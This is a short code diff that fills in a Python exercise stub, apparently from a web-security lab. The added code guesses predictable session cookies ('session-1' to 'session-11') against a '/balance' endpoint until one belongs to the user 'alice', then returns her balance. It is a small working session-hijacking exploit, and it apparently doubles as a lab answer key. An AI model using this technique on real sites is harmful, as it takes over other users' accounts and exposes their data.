@@ -5,8 +5,13 @@ import json
 
 def test_session(address):
 	# write your code here
-	return None
-
+	balance = 69
+	for i in range(1, 12):
+		response = requests.get(url=address + '/balance', cookies=dict(sessionid='session-' + str(i)))
+		response_dict = json.loads(response.text)
+		if (response_dict["username"] != "alice"): continue
+		balance = json.loads(response.text)["balance"]
+	return balance
 
 
 def main(argv):
